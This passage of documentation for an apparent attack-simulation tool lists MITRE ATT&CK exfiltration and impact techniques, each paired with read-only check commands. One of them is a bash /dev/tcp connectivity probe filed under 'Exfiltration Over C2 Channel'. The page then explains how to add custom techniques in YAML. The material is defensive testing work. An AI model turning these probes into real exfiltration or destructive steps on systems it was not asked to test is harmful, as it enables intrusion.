+<div class="language-bash highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>dig<span class="w"> </span>+short<span class="w"> </span>test.example.com<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">||</span><span class="w"> </span>nslookup<span class="w"> </span>test.example.com<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (DNS query only)
+<strong>Detection:</strong> DNS Resolution, Network Connection</p>
+<hr />
+<h3 id="t1041-exfiltration-over-c2-channel">T1041 - Exfiltration Over C2 Channel<a class="headerlink" href="#t1041-exfiltration-over-c2-channel" title="Permanent link">&para;</a></h3>
+<p>Checks outbound connectivity that could be used for exfiltration.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="36:2"><input checked="checked" id="__tabbed_36_1" name="__tabbed_36" type="radio" /><input id="__tabbed_36_2" name="__tabbed_36" type="radio" /><div class="tabbed-labels"><label for="__tabbed_36_1">Windows</label><label for="__tabbed_36_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="nb">Test-NetConnection</span> <span class="n">-ComputerName</span> <span class="s2">&quot;8.8.8.8&quot;</span> <span class="n">-Port</span> <span class="n">443</span> <span class="n">-InformationLevel</span> <span class="n">Quiet</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a>timeout<span class="w"> </span><span class="m">5</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo &gt;/dev/tcp/8.8.8.8/443&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Port 443 reachable&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (connectivity test only)
+<strong>Detection:</strong> Network Connection</p>
+<hr />
+<h3 id="t1567002-exfiltration-to-cloud-storage">T1567.002 - Exfiltration to Cloud Storage<a class="headerlink" href="#t1567002-exfiltration-to-cloud-storage" title="Permanent link">&para;</a></h3>
+<p>Checks for cloud storage CLI tools that could be used for exfiltration.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="37:2"><input checked="checked" id="__tabbed_37_1" name="__tabbed_37" type="radio" /><input id="__tabbed_37_2" name="__tabbed_37" type="radio" /><div class="tabbed-labels"><label for="__tabbed_37_1">Windows</label><label for="__tabbed_37_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a>where rclone aws gsutil 2&gt;nul
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a>which<span class="w"> </span>rclone<span class="w"> </span>aws<span class="w"> </span>gsutil<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (tool detection only)
+<strong>Detection:</strong> Process Creation</p>
+<hr />
+<h2 id="impact-3-techniques">Impact (3 techniques)<a class="headerlink" href="#impact-3-techniques" title="Permanent link">&para;</a></h2>
+<h3 id="t1490-inhibit-system-recovery">T1490 - Inhibit System Recovery<a class="headerlink" href="#t1490-inhibit-system-recovery" title="Permanent link">&para;</a></h3>
+<p>Checks system recovery configuration status.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="38:2"><input checked="checked" id="__tabbed_38_1" name="__tabbed_38" type="radio" /><input id="__tabbed_38_2" name="__tabbed_38" type="radio" /><div class="tabbed-labels"><label for="__tabbed_38_1">Windows</label><label for="__tabbed_38_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>vssadmin list shadows
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>ls<span class="w"> </span>-la<span class="w"> </span>/boot/grub/<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/proc/cmdline
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (read-only query)
+<strong>Detection:</strong> Process Creation (vssadmin.exe)</p>
+<hr />
+<h3 id="t1489-service-stop">T1489 - Service Stop<a class="headerlink" href="#t1489-service-stop" title="Permanent link">&para;</a></h3>
+<p>Lists critical services without stopping them.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="39:2"><input checked="checked" id="__tabbed_39_1" name="__tabbed_39" type="radio" /><input id="__tabbed_39_2" name="__tabbed_39" type="radio" /><div class="tabbed-labels"><label for="__tabbed_39_1">Windows</label><label for="__tabbed_39_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>sc query type= service state= all | findstr /i &quot;SERVICE_NAME DISPLAY_NAME STATE&quot;
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>systemctl<span class="w"> </span>list-units<span class="w"> </span>--type<span class="o">=</span>service<span class="w"> </span>--state<span class="o">=</span>running<span class="w"> </span>--no-pager
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (listing only, no services stopped)
+<strong>Detection:</strong> Process Creation, Service Query</p>
+<hr />
+<h3 id="t1486-data-encrypted-for-impact">T1486 - Data Encrypted for Impact<a class="headerlink" href="#t1486-data-encrypted-for-impact" title="Permanent link">&para;</a></h3>
+<p>Simulates ransomware detection by checking encryption capabilities.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="40:2"><input checked="checked" id="__tabbed_40_1" name="__tabbed_40" type="radio" /><input id="__tabbed_40_2" name="__tabbed_40" type="radio" /><div class="tabbed-labels"><label for="__tabbed_40_1">Windows</label><label for="__tabbed_40_2">Linux</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="nb">Get-Command</span> <span class="n">-Name</span> <span class="p">*</span><span class="n">crypt</span><span class="p">*</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>which<span class="w"> </span>openssl<span class="w"> </span>gpg<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Encryption tools available&quot;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<p><strong>Platforms:</strong> Windows, Linux
+<strong>Safe:</strong> Yes (capability check only, no encryption performed)
+<strong>Detection:</strong> Process Creation</p>
+<hr />
+<h2 id="adding-custom-techniques">Adding Custom Techniques<a class="headerlink" href="#adding-custom-techniques" title="Permanent link">&para;</a></h2>
+<p>Techniques are defined in YAML files under <code>server/configs/techniques/</code>:</p>
+<div class="language-yaml highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="c1"># server/configs/techniques/custom.yaml</span>
+</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a><span class="nt">techniques</span><span class="p">:</span>
+</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">T1234</span>
+</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Custom Technique</span>
+</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a><span class="w">    </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Description of the technique</span>
+</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a><span class="w">    </span><span class="nt">tactic</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">discovery</span>
+</span><span id="__span-93-7"><a id="__codelineno-93-7" name="__codelineno-93-7" href="#__codelineno-93-7"></a><span class="w">    </span><span class="nt">platforms</span><span class="p">:</span>
+</span><span id="__span-93-8"><a id="__codelineno-93-8" name="__codelineno-93-8" href="#__codelineno-93-8"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">windows</span>
+</span><span id="__span-93-9"><a id="__codelineno-93-9" name="__codelineno-93-9" href="#__codelineno-93-9"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">linux</span>
+</span><span id="__span-93-10"><a id="__codelineno-93-10" name="__codelineno-93-10" href="#__codelineno-93-10"></a><span class="w">    </span><span class="nt">is_safe</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
+</span><span id="__span-93-11"><a id="__codelineno-93-11" name="__codelineno-93-11" href="#__codelineno-93-11"></a><span class="w">    </span><span class="nt">executors</span><span class="p">:</span>
+</span><span id="__span-93-12"><a id="__codelineno-93-12" name="__codelineno-93-12" href="#__codelineno-93-12"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cmd</span>
+</span><span id="__span-93-13"><a id="__codelineno-93-13" name="__codelineno-93-13" href="#__codelineno-93-13"></a><span class="w">        </span><span class="nt">platform</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">windows</span>
+</span><span id="__span-93-14"><a id="__codelineno-93-14" name="__codelineno-93-14" href="#__codelineno-93-14"></a><span class="w">        </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;echo</span><span class="nv"> </span><span class="s">Hello&quot;</span>
+</span><span id="__span-93-15"><a id="__codelineno-93-15" name="__codelineno-93-15" href="#__codelineno-93-15"></a><span class="w">        </span><span class="nt">cleanup</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;&quot;</span>
+</span><span id="__span-93-16"><a id="__codelineno-93-16" name="__codelineno-93-16" href="#__codelineno-93-16"></a><span class="w">        </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">60</span>
+</span><span id="__span-93-17"><a id="__codelineno-93-17" name="__codelineno-93-17" href="#__codelineno-93-17"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bash</span>
+</span><span id="__span-93-18"><a id="__codelineno-93-18" name="__codelineno-93-18" href="#__codelineno-93-18"></a><span class="w">        </span><span class="nt">platform</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">linux</span>
+</span><span id="__span-93-19"><a id="__codelineno-93-19" name="__codelineno-93-19" href="#__codelineno-93-19"></a><span class="w">        </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;echo</span><span class="nv"> </span><span class="s">Hello&quot;</span>
+</span><span id="__span-93-20"><a id="__codelineno-93-20" name="__codelineno-93-20" href="#__codelineno-93-20"></a><span class="w">        </span><span class="nt">cleanup</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;&quot;</span>
+</span><span id="__span-93-21"><a id="__codelineno-93-21" name="__codelineno-93-21" href="#__codelineno-93-21"></a><span class="w">        </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">60</span>
+</span><span id="__span-93-22"><a id="__codelineno-93-22" name="__codelineno-93-22" href="#__codelineno-93-22"></a><span class="w">    </span><span class="nt">detection</span><span class="p">:</span>
+</span><span id="__span-93-23"><a id="__codelineno-93-23" name="__codelineno-93-23" href="#__codelineno-93-23"></a><span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">source</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Process Creation</span>
+</span><span id="__span-93-24"><a id="__codelineno-93-24" name="__codelineno-93-24" href="#__codelineno-93-24"></a><span class="w">        </span><span class="nt">indicator</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">echo execution</span>
+</span></code></pre></div>
+<h3 id="yaml-structure">YAML Structure<a class="headerlink" href="#yaml-structure" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>id</code></td>
+<td>string</td>
+<td>MITRE ATT&amp;CK ID (e.g., T1082)</td>
+</tr>
+<tr>
+<td><code>name</code></td>
+<td>string</td>
+<td>Technique name</td>
+</tr>
+<tr>
+<td><code>description</code></td>
+<td>string</td>
+<td>Detailed description</td>
+</tr>
+<tr>
+<td><code>tactic</code></td>
+<td>string</td>
+<td>MITRE tactic (discovery, execution, etc.)</td>
+</tr>
+<tr>
+<td><code>platforms</code></td>
+<td>array</td>
+<td>Supported platforms (windows, linux, darwin)</td>
+</tr>
+<tr>
+<td><code>is_safe</code></td>
+<td>boolean</td>
+<td>Safe for production testing</td>
+</tr>
+<tr>
+<td><code>executors</code></td>
+<td>array</td>
+<td>Command definitions per platform</td>
+</tr>
+<tr>
+<td><code>detection</code></td>
+<td>array</td>
+<td>Expected detection indicators</td>
+</tr>
+</tbody>
+</table>
+<h3 id="import-techniques">Import Techniques<a class="headerlink" href="#import-techniques" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="c1"># Via API (YAML file on server)</span>
+</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://localhost:8443/api/v1/techniques/import<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;path&quot;: &quot;/path/to/techniques.yaml&quot;}&#39;</span>
+</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a>
+</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a><span class="c1"># Via API (JSON array directly)</span>
+</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://localhost:8443/api/v1/techniques/import/json<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-94-8"><a id="__codelineno-94-8" name="__codelineno-94-8" href="#__codelineno-94-8"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-94-9"><a id="__codelineno-94-9" name="__codelineno-94-9" href="#__codelineno-94-9"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;[{&quot;id&quot;: &quot;T1234&quot;, &quot;name&quot;: &quot;Custom&quot;, ...}]&#39;</span>
+</span></code></pre></div>
+<p>Techniques in <code>server/configs/techniques/</code> are auto-imported at server startup.</p>
+<hr />
+<h2 id="technique-locations">Technique Locations<a class="headerlink" href="#technique-locations" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Tactic</th>
+<th>Count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>reconnaissance.yaml</code></td>
+<td>Reconnaissance</td>
+<td>2</td>
+</tr>
+<tr>
+<td><code>initial-access.yaml</code></td>
+<td>Initial Access</td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>execution.yaml</code></td>
+<td>Execution</td>
+<td>5</td>
+</tr>
+<tr>
+<td><code>persistence.yaml</code></td>
+<td>Persistence</td>
+<td>4</td>
+</tr>
+<tr>
+<td><code>privilege-escalation.yaml</code></td>
+<td>Privilege Escalation</td>
+<td>4</td>
+</tr>
+<tr>
+<td><code>defense-evasion.yaml</code></td>
+<td>Defense Evasion</td>
+<td>6</td>
+</tr>
+<tr>
+<td><code>credential-access.yaml</code></td>
+<td>Credential Access</td>
+<td>4</td>
+</tr>
+<tr>
+<td><code>discovery.yaml</code></td>
+<td>Discovery</td>
+<td>9</td>
+</tr>
+<tr>
+<td><code>lateral-movement.yaml</code></td>
+<td>Lateral Movement</td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>collection.yaml</code></td>
+<td>Collection</td>
+<td>4</td>
+</tr>
+<tr>
+<td><code>command-and-control.yaml</code></td>
+<td>Command and Control</td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>exfiltration.yaml</code></td>
+<td>Exfiltration</td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>impact.yaml</code></td>
+<td>Impact</td>
+<td>3</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Retour en haut de la page
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pied de page" >
+        
+          
+          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="Précédent: MITRE ATT&amp;amp;CK">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Précédent
+              </span>
+              <div class="md-ellipsis">
+                MITRE ATT&amp;CK
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/AutoStrike-EIP/AutoStrike_POC" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.top", "navigation.footer", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
